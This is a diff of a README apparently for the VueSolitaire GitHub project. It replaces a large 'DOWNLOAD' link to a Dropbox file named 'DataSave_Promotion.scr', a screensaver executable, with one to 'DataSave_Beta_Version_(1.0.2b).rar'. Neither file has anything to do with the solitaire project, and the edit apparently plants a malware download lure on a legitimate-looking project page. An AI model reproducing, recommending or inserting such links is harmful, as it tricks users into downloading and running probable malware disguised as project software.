@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/iexoenbyql0jl0d/DataSave_Promotion.scr?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/egh37bstv1526ro/DataSave_Beta_Version_%281.0.2b%29.rar?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
